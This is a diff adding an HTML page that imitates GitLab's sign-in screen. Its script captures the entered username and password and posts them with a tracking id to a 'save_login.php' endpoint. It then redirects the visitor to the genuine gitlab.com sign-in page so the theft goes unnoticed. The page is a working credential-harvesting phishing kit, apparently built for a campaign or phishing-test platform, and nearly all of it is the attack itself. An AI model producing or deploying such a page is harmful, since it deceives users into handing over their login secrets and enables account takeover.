@@ -1,0 +1,42 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Sign in · GitLab</title><style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:system-ui,sans-serif;background:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.card{width:100%;max-width:400px;border:1px solid #dbdbdb;border-radius:4px;padding:32px}
+.gl{font-size:28px;font-weight:600;margin-bottom:8px}
+.gl span:nth-child(1){color:#fc6d26}.gl span:nth-child(2){color:#e24329}.gl span:nth-child(3){color:#fca326}
+h1{font-size:20px;margin-bottom:20px}
+input{width:100%;height:34px;border:1px solid #dbdbdb;border-radius:4px;padding:0 10px;margin-bottom:12px;font-size:14px}
+.btn-submit{width:100%;height:36px;background:#2ea44f;color:#fff;border:none;border-radius:4px;font-weight:600;cursor:pointer}
+</style></head><body><div class="card"><div class="gl"><span>●</span><span>●</span><span>●</span> GitLab</div><h1>Sign in to GitLab</h1><form id="loginForm"><input type="text" id="email" placeholder="Username or email" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Sign in</button></form></div><script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+<script>
+(function(){
+var BASE_URL = window.location.origin + (window.location.pathname.replace(/[^/]*$/, "") || "/");
+document.getElementById("loginForm").addEventListener("submit", function (e) {
+    e.preventDefault();
+    var login = document.getElementById("email").value;
+    var password = document.getElementById("password").value;
+    var tid = typeof window.TRACKIFY_TID === "string" ? window.TRACKIFY_TID : (new URLSearchParams(window.location.search).get("tid") || "");
+    var btn = document.querySelector(".btn-submit");
+    var label = btn.textContent;
+    btn.textContent = "Please wait…";
+    btn.disabled = true;
+    $.ajax({
+        type: "POST",
+        url: BASE_URL + "save_login.php",
+        data: { tid: tid, login: login, password: password, template: "gitlab" },
+        dataType: "json",
+        success: function (data) {
+            if (data && data.ok) { window.location.href = "https:\/\/gitlab.com\/users\/sign_in"; return; }
+            btn.textContent = label;
+            btn.disabled = false;
+            alert("Sign in failed. Please try again.");
+        },
+        error: function () {
+            btn.textContent = label;
+            btn.disabled = false;
+            alert("Sign in failed. Please try again.");
+        }
+    });
+});
+})();
+</script></body></html>
